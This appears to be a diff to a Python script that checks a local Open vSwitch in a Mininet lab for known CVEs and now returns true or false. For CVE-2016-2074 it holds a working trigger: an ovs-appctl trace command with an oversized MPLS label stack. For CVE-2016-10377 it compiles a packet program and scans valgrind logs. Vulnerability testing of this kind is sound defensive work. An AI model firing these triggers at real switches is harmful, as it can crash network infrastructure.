@@ -1,4 +1,6 @@
 import os
+import subprocess
+import re
 import ovs_config
 from mininet.log import setLogLevel
 from time import sleep
@@ -6,17 +8,26 @@ from mininet_setup import MininetNetwork
 
 def cve_2016_2074():
     os.system('sudo ovs-vsctl add-br br0')
-    os.system('ovs-appctl ofproto/trace br0 in_port=1 ffffffffffff0000000000008847$(for i in $(seq 512); do printf cccc; done)')
+   
+    mpls = 'sudo ovs-appctl ofproto/trace br0 in_port=1 ffffffffffff0000000000008847$(for i in $(seq 512); do printf cccc; done)'
+    process = subprocess.Popen(mpls, shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
+    output, _ = process.communicate()
 
     os.system('sudo ovs-vsctl del-br br0')
+
+    vulnerable = False
+    if 'ovs-vswitchd: transaction error' in output.decode():
+        vulnerable = True
+
+    return vulnerable
 
 def cve_2016_10377():
 
     setLogLevel('info')
     os.system('gcc packets/cve_2016_10377.c -o packets/cve_2016_10377')
 
-    ovs_config.start_valgrind('cve_2016_10377')
-    
+    log_path = ovs_config.start_valgrind('cve_2016_10377')
+
     mininet = MininetNetwork()
     mininet.mininet_2h_1s()
 
@@ -32,6 +43,15 @@ def cve_2016_10377():
     ovs_config.valgrind_cleanup()
 
     os.system('rm packets/cve_2016_10377')
+
+    vulnerable = False
+    with open(log_path, 'r') as log_file:
+        log_content = log_file.read()
+        error = re.compile(r'Uninitialised value was created by a stack allocation')
+        if error.search(log_content):
+            vulnerable = True
+
+    return vulnerable
 
 def cve_2017_9264():
     pass
@@ -63,6 +83,8 @@ def cve_2023_1668():
 
 # This is for testing purposes:
 if __name__ == '__main__':
-    #cve_2016_2074()
-    cve_2016_10377()
-    #cve_2022_32166()  
+    test = cve_2016_2074()
+    #test = cve_2016_10377()
+    #cve_2022_32166()
+    print(test)
+  
